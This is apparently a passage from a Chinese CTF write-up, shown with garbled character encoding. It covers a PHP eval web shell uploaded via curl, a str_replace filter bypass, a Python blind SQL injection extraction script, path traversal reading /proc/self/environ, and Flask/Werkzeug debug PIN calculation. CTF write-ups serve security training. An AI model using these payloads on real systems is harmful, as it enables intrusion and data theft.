<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">"filename=shell.php&amp;data=&lt;?php eval(@<span class="token variable">$_POST</span>['shell']); ?&gt;"</span> <span class="token parameter variable">-b</span> <span class="token string">"PHPSESSID=xxxx"</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/ffffffLag.php</code></pre>

<p>Web Shell <span class="hexo-wm">sâ€‹â€‹â‘¶â…´ğnâ€¢â€‹ï»¿ğ˜´ğ˜ªï»¿teâ€</span>ç”Ÿæˆå®Œæ¯•åä½¿ç”¨ <code>ä¸­å›½èšå‰‘antSword</code> è¿æ¥é¶æœº</p>
<p>æ³¨æ„æ­¤å¤„è¿æ¥å¯†ç ä¸º <code>data</code> ä¸­ <code>POST</code> çš„å‚æ•°åç§°</p>
<p><img src="image-13.png" alt="image-13.png"></p>
<p>è¿›å…¥æ ¹ç›®å½•å³å¯æ‰¾åˆ° <code>flag</code></p>
<p><img src="image-14.png" alt="image-14.png"></p>
<p>Flag:</p>
<blockquote>
<p>Spirit{30df4f45-<span class="hexo-wm">sï»¿ï»¿â‘¶â…´ï½…ğ˜¯.â€ğ˜€ï½‰â€Œâ€Œğ’•ğ˜¦â€</span>adf4-478d-a90a-00e3f91877c7}</p>
</blockquote>
<h3 id="3-3-PS-str-replace-ç»•è¿‡æ–¹æ³•"><a href="#3-3-PS-str-replace-ç»•è¿‡æ–¹æ³•" class="headerlink" title="3.3 PS: str_replace ç»•è¿‡æ–¹æ³•"></a>3.3 PS: str_replace ç»•è¿‡æ–¹æ³•</h3><p><code>str_replace</code> å¯ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œä¾‹å¦‚ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php">data <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡</p>
<pre class="language-php" data-language="php"><code class="language-php">data <span class="token operator">=</span> pphphp</code></pre>
<p>æ­¤å¤„ <code>str_replace</code> å‡½æ•°å°† <code>p{php}hp</code> ä¸­èŠ±æ‹¬å·éƒ¨åˆ†æ›¿<span class="hexo-wm">ğ˜€â€Œâ€‹â‘¶ğ’—ğ˜¦ï½â€¤ï»¿â€êœ±iâ€‹ğ’•â„®â€‹ï»¿</span>æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œ</p>
<p>æœ€åä»å‰©ä½™ <code>php</code> ï¼Œä»è€Œè¾¾åˆ°ç»•è¿‡æ•ˆæœ</p>
<h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h1><p>é¢˜ç›®æè¿°:</p>
<blockquote>
<p>Hint: sqlç›²æ³¨</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢å‘ç°æœ‰ä¸€<span class="hexo-wm">sâ€ŒÂ³veğ˜¯ï¼â€‹êœ±â…ˆï»¿â€‹ğ’•eâ€ï»¿</span>ä¸ªè®¤è¯ç™»å½•ç•Œé¢</p>
<p><img src="image-15.png" alt="image-15.png"></p>
<p>æ ¹æ®æç¤ºsqlç›²æ³¨å¾—çŸ¥</p>
<p>æˆ‘ä»¬æ— æ³•é€šè¿‡æ˜¾æ€§æ–¹å¼ç›´æ¥è·å–æ•°æ®ï¼Œ<span class="hexo-wm">Ñ•ï»¿Â³ğ¯ï½…ğ˜¯Â·â€‹â€‹ğ’”ï½‰â€tï½…â€â€‹</span>ä½†å¯ä»¥é€šè¿‡ä¸åŒè¾“å…¥çš„å›æ˜¾å€¼ä¸åŒæ¥åˆ¤æ–­è¾“å…¥æ¡ä»¶æ˜¯å¦æˆç«‹</p>
<p>å› æ­¤æˆ‘ä»¬å°è¯•åˆ¤æ–­æ¡ä»¶ <code>True</code> å’Œ <code>False</code> çš„å›æ˜¾å€¼åŒºåˆ«</p>
<blockquote>
<p>ç»è¿‡åˆæ­¥å°è¯•å‘ç°å±è”½äº†ç©ºæ ¼çš„è¾“å…¥ï¼Œ<span class="hexo-wm">êœ±ï»¿â‘¶ğ¯eğ˜¯.<span class="hexo-wm">ğ˜€â€‹â€‹ğŸ¯vğ˜¦ğ’.â€‹â€‹sğ˜ªâ€‹ğ˜µeâ€‹â€</span>â€ğ˜€iï»¿ğ’•â„®ï»¿</span>è‹¥åŒ…å«ç©ºæ ¼åˆ™ä¼š <code>alert Hack!</code></p>
<p>æ­¤å¤„ä½¿ç”¨ <code>/**/</code> æ›¿æ¢ç©ºæ ¼ï¼Œä»¥<span class="hexo-wm">Ñ•ï»¿ğŸ¯ğ¯ğ˜¦ğ§âˆ™â€Œï»¿sğ˜ªâ€‹ğ˜µï½…â€Œ</span>ç»•è¿‡ç©ºæ ¼å±è”½</p>
</blockquote>
<p>ç”±äºç™»å½•ç•Œé¢çš„sqlæ³¨å…¥åº”ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œå› æ­¤åˆ†åˆ«å°è¯•ä½¿ç”¨ä»¥ä¸‹è¡¨å•è¿›è¡Œæµ‹è¯•</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>admin'<span class="token comment">/**/</span>and<span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">0</span>#
password<span class="token operator">=</span><span class="token number">123</span>

alert ç”¨æˆ·åä¸å­˜åœ¨<span class="token operator">!</span></code></pre>

<pre class="language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>admin'<span class="token comment">/**/</span>and<span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>#
password<span class="token operator">=</span><span class="token number">123</span>

alert å¯†ç é”™è¯¯<span class="token operator">!</span></code></pre>

<p>æ ¹æ® <code>alert</code> çš„å†…å®¹å¯ä»¥åˆ¤æ–­å‡ºç½‘é¡µåç«¯å¯¹<span class="hexo-wm">ğ˜€â€‹Â³ğ˜·ğğ§â€¢â€ï»¿Ñ•iï»¿ï½”ğâ€</span>ç™»å½•è¡¨å•çš„æ ¡éªŒæ˜¯ç”¨æˆ·åä¸å¯†ç åˆ†ç¦»çš„</p>
<p>å³å…ˆè¿›è¡Œç”¨æˆ·åå­˜åœ¨æ€§æ ¡éªŒï¼Œ<span class="hexo-wm">ğ˜´â€‹â€‹ğŸ¯ğ¯ğ˜¦ğ’âˆ™â€‹ğ˜´â…ˆâ€Œâ€‹ğ’•ğ˜¦â€Œâ€</span>å†è¿›è¡Œå¯†ç æ­£ç¡®æ€§æ ¡éªŒ</p>
<p>è¿™ç§è®¾ç½®ç»™äº†æˆ‘ä»¬å®ç° <code>sqlå¸ƒå°”ç›²æ³¨</code> çš„å¯èƒ½</p>
<p>åªéœ€æ„é€  <code>username</code> çš„ <code>payload</code> ï¼Œå°±å¯ä»¥æ ¹æ®<span class="hexo-wm">ğ˜€â€ŒÂ³veğ˜¯â€¤ï»¿sğ˜ªï»¿ğ’•ğï»¿â€‹</span>å›æ˜¾å€¼çš„ä¸åŒåˆ¤æ–­ <code>payload</code> ä¸­çš„æ„é€ æ¡ä»¶æ˜¯å¦æˆç«‹</p>
<p>å› æ­¤æ•°æ®é•¿åº¦å¯ä»¥é€šè¿‡ <code>length()</code> å‡½æ•°å¹¶æšä¸¾é•¿åº¦è¿›è¡Œæ¯”å¯¹æ¥åˆ¤æ–­<br>æ•°æ®å†…å®¹å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>substr()</code> ã€ <code>mid()</code> ã€ <code>substring()</code> ç­‰å‡½æ•°å¯¹æ•°æ®ä¸­çš„å­—ç¬¦é€ä¸ªè¿›è¡Œæˆªå–å¹¶ä¸å­—ç¬¦è¡¨æ¯”å¯¹æ¥è¯»å–</p>
<p>sqlæ•°æ®æˆªå–å‡½æ•°ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>substr(string, start, length)ï¼šå°† string ä» start å¼€å§‹çš„ä½ç½®ï¼Œæˆªå– length ä¸ªå­—ç¬¦<br>mid(string, start, length)ï¼šå°† string ä» start å¼€å§‹çš„ä½ç½®ï¼Œæˆªå– length ä¸ªå­—ç¬¦<br>substring(string, start, <span class="hexo-wm">sâ€ï»¿â‘¶ğ˜·ğğ˜¯â€¤â€sğ˜ªâ€ğ­â„®â€Œ</span>length)ï¼šå°† string ä» <span class="hexo-wm">ğ’”â€‹â€ŒğŸ¯â…´ğğ§â€¤â€‹ğ˜´ğ¢â€‹ï»¿ğ­â„®â€</span>start å¼€å§‹çš„ä½ç½®ï¼Œæˆªå– length ä¸ªå­—ç¬¦</p>
</blockquote>
<p>æ„é€  <code>payload</code> æœ‰æ•ˆè½½è· å¦‚ä¸‹:</p>
<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"admin'/**/and/**/length(({0}))={1}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token comment">#åˆ¤æ–­æ•°æ®é•¿åº¦</span>
payload <span class="token operator">=</span> <span class="token string">"admin'and/**/ascii(substr(({0}),{1},1))={2}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#é€å­—ç¬¦è¯»å–æ•°æ®å†…å®¹</span>
å…¶ä¸­ data_payload ä¸ºå¯è¾“å‡ºæ•°æ®å†…å®¹çš„è¯­å¥ <span class="token punctuation">(</span>selectè¯­å¥ç­‰<span class="token punctuation">)</span></code></pre>

<p>æ„é€  <code>Python</code> æ”»å‡»ä»£ç å¦‚ä¸‹</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 
chars <span class="token operator">=</span> <span class="token string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~{}"</span> <span class="token comment">#å¸¸ç”¨å­—ç¬¦è¡¨</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token comment">#åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦</span>
<span class="token keyword">def</span> <span class="token function">get_length</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"admin'/**/and/**/length(({0}))={1}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">}</span>
        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> length <span class="token operator">==</span> value<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The data length is: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>  n
 
<span class="token comment">#è¯»å–å­—ç¬¦ä¸²å†…å®¹</span>
<span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>data_length<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>data_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token string">"admin'and/**/ascii(substr(({0}),{1},1))={2}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">}</span>
            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">if</span> length <span class="token operator">==</span> value<span class="token punctuation">:</span>
                result <span class="token operator">+=</span> char
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Reading data: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
 
 
url <span class="token operator">=</span> <span class="token string">"(SpiritCTF Server URL with port)/index.php"</span>
data_payload <span class="token operator">=</span> <span class="token string">"xxxx"</span>
value <span class="token operator">=</span> <span class="token number">3297</span> <span class="token comment">#æ­¤å¤„åº”æ ¹æ®å®é™…è®¾ç½®ä¸ºpayloadæ„é€ æ¡ä»¶æˆç«‹æ—¶responseçš„é•¿åº¦</span>
 
length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span>
get_data<span class="token punctuation">(</span>length<span class="token punctuation">,</span>value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The data is: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span></code></pre>

<p>ç”±äºä¸çŸ¥é“ <code>flag</code> å†…å®¹çš„å­˜æ”¾ä½ç½®ï¼Œåº”å…ˆå¯¹å­˜æ”¾ç€ <code>flag</code> å†…å®¹çš„æ•°æ®åº“åã€æ•°æ®è¡¨åã€<span class="hexo-wm">ğ¬ï»¿Â³ğ¯eğ’âˆ™â€‹â€ğ’”ğ¢ï»¿â€‹teï»¿â€</span>å­—æ®µåè¿›è¡Œè¯»å–ï¼Œæœ€åå†è¯»å– <code>flag</code> å†…å®¹</p>
<h2 id="1-è¯»å–æ•°æ®åº“å"><a href="#1-è¯»å–æ•°æ®åº“å" class="headerlink" title="1. è¯»å–æ•°æ®åº“å"></a>1. è¯»å–æ•°æ®åº“å</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"database()"</span></code></pre>

<p>è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img src="image-16.png" alt="image-16.png"></p>
<p>å¾—åˆ°æ•°æ®åº“åä¸º <code>jluCTF</code></p>
<h2 id="2-è¯»å–æ•°æ®è¡¨åï¼ˆé»˜è®¤ç¬¬ä¸€å¼ è¡¨ï¼‰"><a href="#2-è¯»å–æ•°æ®è¡¨åï¼ˆé»˜è®¤ç¬¬ä¸€å¼ è¡¨ï¼‰" class="headerlink" title="2. è¯»å–æ•°æ®è¡¨åï¼ˆé»˜è®¤ç¬¬ä¸€å¼ è¡¨ï¼‰"></a>2. è¯»å–æ•°æ®è¡¨åï¼ˆé»˜è®¤ç¬¬ä¸€å¼ è¡¨ï¼‰</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='jluCTF'/**/limit/**/0,1"</span></code></pre>

<p>è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img src="image-17.png" alt="image-17.png"></p>
<p>å¾—åˆ°æ•°æ®è¡¨åä¸º <code>flag</code></p>
<h2 id="3-è¯»å–å­—æ®µå-é»˜è®¤ç¬¬ä¸€ä¸ªå­—æ®µ"><a href="#3-è¯»å–å­—æ®µå-é»˜è®¤ç¬¬ä¸€ä¸ªå­—æ®µ" class="headerlink" title="3. è¯»å–å­—æ®µå (é»˜è®¤ç¬¬ä¸€ä¸ªå­—æ®µ)"></a>3. è¯»å–å­—æ®µå (é»˜è®¤ç¬¬ä¸€ä¸ªå­—æ®µ)</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='jluCTF'/**/and/**/table_name='flag'/**/limit/**/0,1"</span></code></pre>
<p><img src="image-18.png" alt="image-18.png"></p>
<p>å¾—åˆ°å­—æ®µåä¸º <code>flag</code></p>
<h2 id="4-è¯»å–-flag-å†…å®¹"><a href="#4-è¯»å–-flag-å†…å®¹" class="headerlink" title="4. è¯»å– flag å†…å®¹"></a>4. è¯»å– <code>flag</code> å†…å®¹</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/flag/**/from/**/flag"</span></code></pre>

<p>è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img src="image-19.png" alt="image-19.png"></p>
<p>å¾—åˆ° <code>flag</code> ï¼š</p>
<pre class="language-none"><code class="language-none">Spirit{64e90c7c-e9bc-4809-aa91-ade46ceffbb1}</code></pre>

<h1 id="pin-pin-revenge"><a href="#pin-pin-revenge" class="headerlink" title="pin &amp; pin_revenge"></a>pin &amp; pin_revenge</h1><p>pin é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>PIN~PON!</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå‘ç°è·³è½¬åˆ°äº† <code>/?location=index.html</code></p>
<p>é¡µé¢æ˜¾ç¤º <code>qwq</code> ï¼ˆï¼Ÿï¼‰<br><img src="image-20.png" alt="image-20.png"></p>
<p>ç»è¿‡æµ‹è¯•å‘ç° <code>/?location=</code> å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
<h2 id="1-éé¢„æœŸè§£-ä»…piné¢˜å†…å­˜åœ¨"><a href="#1-éé¢„æœŸè§£-ä»…piné¢˜å†…å­˜åœ¨" class="headerlink" title="1. éé¢„æœŸè§£ (ä»…piné¢˜å†…å­˜åœ¨)"></a>1. éé¢„æœŸè§£ (ä»…piné¢˜å†…å­˜åœ¨)</h2><p>ç”±äºè¯¥é¢˜çš„ç¯å¢ƒ<span class="hexo-wm">êœ±ï»¿3ğ’—ğğ§âˆ™â€‹Ñ•ğ¢â€‹â€ğ˜µï½…â€‹â€‹</span>å˜é‡æ²¡æœ‰åˆ é™¤å¹²å‡€ï¼Œ</p>
<p>å› æ­¤å¯ä»¥ä»å½“å‰è¿›ç¨‹<span class="hexo-wm">sâ€Â³â…´ğnï¼ï»¿Ñ•iâ€‹ğ’•ğï»¿â€</span>çš„ç¯å¢ƒå˜é‡æ–‡ä»¶ä¸­è¯»å– <code>flag</code> å†…å®¹</p>
<p><code>payload</code> å¦‚ä¸‹:</p>
<pre class="language-none"><code class="language-none">/?location=../../../../../../proc/self/environ</code></pre>
<p>é¡µé¢è¿”å›å¦‚ä¸‹å†…å®¹ï¼š</p>
<pre class="language-none"><code class="language-none">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=20be9d370cb1FLAG=Spirit{badd44f8-94eb-4648-b5d3-cdf837431e52}LANG=C.UTF-8GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_VERSION=3.11.3PYTHON_PIP_VERSION=22.3.1PYTHON_SETUPTOOLS_VERSION=65.5.1PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/0d8570dc44796f4369b652222cf176b3db6ac70e/public/get-pip.pyPYTHON_GET_PIP_SHA256=96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207HOME=/rootWERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true</code></pre>

<p>ä»ä¸­è·å¾— <code>pin</code> é¢˜çš„ <code>flag</code> å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">Spirit{badd44f8-94eb-4648-b5d3-cdf837431e52}</code></pre>

<h2 id="2-é¢„æœŸè§£-pin-pin-revengeé€šç”¨"><a href="#2-é¢„æœŸè§£-pin-pin-revengeé€šç”¨" class="headerlink" title="2. é¢„æœŸè§£ (pin&amp;pin_revengeé€šç”¨)"></a>2. é¢„æœŸè§£ (pin&amp;pin_revengeé€šç”¨)</h2><p>PINç æ˜¯Flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼ã€‚</p>
<p>è¿™ä¸¤é¢˜æ—¨åœ¨è€ƒæŸ¥é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è®¡ç®— <span class="hexo-wm">Ñ•ï»¿â€‹Â³ğ’—ï½…ï½âˆ™â€Œsiï»¿ï»¿ğ˜µâ„®â€‹â€‹</span>python flask debug æ¨¡å¼ä¸‹çš„ pin ç ï¼Œå¹¶åˆ©ç”¨debug shellè¯»å–flag</p>
<p>è®¡ç®—é€»è¾‘ä½äº <code>python3.x/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name</code>ï¼Œ</p>
<p>ç‰ˆæœ¬ä¸åŒçš„åŒºåˆ«åœ¨äº3.6ä¸3.<span class="hexo-wm">êœ±â€Œâ€‹ğŸ¯ğ¯ğ˜¦ğ˜¯.â€ŒÑ•â…ˆï»¿â€ğ­ï½…â€Œï»¿</span>8çš„md5åŠ å¯†å’Œsha1åŠ å¯†ä¸åŒã€‚</p>
<h3 id="2-1-PINç”Ÿæˆè¦ç´ "><a href="#2-1-PINç”Ÿæˆè¦ç´ " class="headerlink" title="2.1 PINç”Ÿæˆè¦ç´ "></a>2.1 PINç”Ÿæˆè¦ç´ </h3><h4 id="2-1-1-username"><a href="#2-1-1-username" class="headerlink" title="2.1.1 username"></a>2.1.1 username</h4><p>ç”¨æˆ·åã€‚é€šè¿‡ getpass.<span class="hexo-wm">Ñ•â€‹â‘¶vï½…ğ˜¯â€¤â€Œğ¬iï»¿â€‹ğ­ğ˜¦ï»¿â€‹</span>getuser() è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶ <code>/etc/passwd</code> è¯»å–ã€‚</p>
<h4 id="2-1-2-modname"><a href="#2-1-2-modname" class="headerlink" title="2.1.2 modname"></a>2.1.2 modname</h4><p>æ¨¡å—åã€‚é€šè¿‡ getattr(mod,<span class="hexo-wm">ğ¬ï»¿â‘¶ğ¯â„¯ï½Â·ï»¿â€êœ±iâ€ï»¿ï½”ğï»¿ï»¿</span>â€fileâ€,None) è¯»å–ï¼Œé»˜è®¤å€¼ä¸º <code>flask.app</code> ã€‚</p>
<h4 id="2-1-3-appname"><a href="#2-1-3-appname" class="headerlink" title="2.1.3 appname"></a>2.1.3 appname</h4><p>åº”ç”¨åã€‚é€šè¿‡ getattr(app,â€nameâ€,<span class="hexo-wm">êœ±â€ğŸ¯ğ¯ğï½âˆ™ï»¿Ñ•ğ¢â€â€‹ğ­ğ˜¦â€â€Œ</span>type(app).name) è¯»å–ï¼Œé»˜è®¤å€¼ä¸º <code>Flask</code> ã€‚</p>
<h4 id="2-1-4-moddir"><a href="#2-1-4-moddir" class="headerlink" title="2.1.4 moddir"></a>2.1.4 moddir</h4><p>Flaskåº“ä¸‹ app.py çš„ç»å¯¹è·¯å¾„ã€‚<span class="hexo-wm">Ñ•ï»¿3ğ’—ï½…ğ˜¯.â€Œâ€êœ±â…ˆï»¿â€Œtï½…ï»¿</span>é€šè¿‡ getattr(mod,â€fileâ€,None) è¯»å–ï¼Œå®é™…åº”ç”¨ä¸­é€šè¿‡æŠ¥é”™è¯»å–ã€‚</p>
<h4 id="2-1-5-uuidnode"><a href="#2-1-5-uuidnode" class="headerlink" title="2.1.5 uuidnode"></a>2.1.5 uuidnode</h4><p>å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡ uuid.getnode() è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶ <code>/sys/class/net/eth0/address</code> å¾—åˆ°16è¿›åˆ¶ç»“æœï¼Œ<span class="hexo-wm">Ñ•ï»¿ğŸ¯â…´ğï½âˆ™ï»¿ğ’”â…ˆâ€Œtğâ€Œâ€‹</span>è½¬åŒ–ä¸º10è¿›åˆ¶è¿›è¡Œè®¡ç®—ã€‚</p>
<h4 id="2-1-6-machine-id"><a href="#2-1-6-machine-id" class="headerlink" title="2.1.6 machine_id"></a>2.1.6 machine_id</h4><p>dockeræœºå™¨idã€‚<span class="hexo-wm">ğ˜€ï»¿3ğ’—â„¯ğ§ï¼â€Œğ˜´ğ¢â€ï½”eâ€‹ï»¿</span>æ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œ</p>
<p>linuxçš„i<span class="hexo-wm">ğ˜€â€‹ğŸ¯ğ’—ï½…ğ’.ï»¿â€ğ’”â…ˆâ€Œâ€‹tï½…â€Œâ€‹</span>dä¸€èˆ¬å­˜æ”¾åœ¨ <code>/etc/machine-id</code> æˆ– <code>/proc/sys/kernel/random/boot_id</code>ï¼Œ</p>
<p>dockeré¶æœºåˆ™è¯»å– <code>/proc/self/cgroup</code> æˆ– <code>/proc/self/mountinfo</code>ï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„ /docker/ å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„idï¼Œåœ¨dockerç¯å¢ƒä¸‹è¯»å–åä¸¤ä¸ªï¼Œédockerç¯å¢ƒä¸‰ä¸ªéƒ½éœ€è¦è¯»å–ã€‚</p>
<p>é¦–å…ˆè®¿é—®/etc/machine-idï¼Œæœ‰å€¼å°±breakï¼Œæ²¡å€¼å°±è®¿é—®/proc/sys/kernel/random/boot_idï¼Œ<span class="hexo-wm">sâ€Œï»¿ğŸ¯ğ˜·eğ˜¯â€¤â€ğ˜€ğ¢ï»¿â€ğ˜µâ„®â€Œï»¿</span>ç„¶åä¸ç®¡æ­¤æ—¶æœ‰æ²¡æœ‰å€¼ï¼Œå†è®¿é—®/proc/self/cgroupå…¶ä¸­çš„å€¼æ‹¼æ¥åˆ°å‰é¢çš„å€¼åé¢ã€‚</p>
<p>Python Flask Debug Pin çš„è®¡ç®—ä»£ç å¦‚ä¸‹ï¼š</p>
<h3 id="2-2-Python-3-8-MD5-Pinè®¡ç®—ä»£ç "><a href="#2-2-Python-3-8-MD5-Pinè®¡ç®—ä»£ç " class="headerlink" title="2.2 Python < 3.8 MD5 Pinè®¡ç®—ä»£ç "></a>2.2 Python &lt; 3.8 MD5 Pinè®¡ç®—ä»£ç </h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
     <span class="token string">'flaskweb'</span><span class="token punctuation">,</span> <span class="token comment">#username</span>
     <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment">#modname</span>
     <span class="token string">'Flask'</span><span class="token punctuation">,</span> <span class="token comment">#appname</span>
     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment">#moddir</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span> <span class="token comment">#uuidnode</span>
     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span> <span class="token comment">#machine_id</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
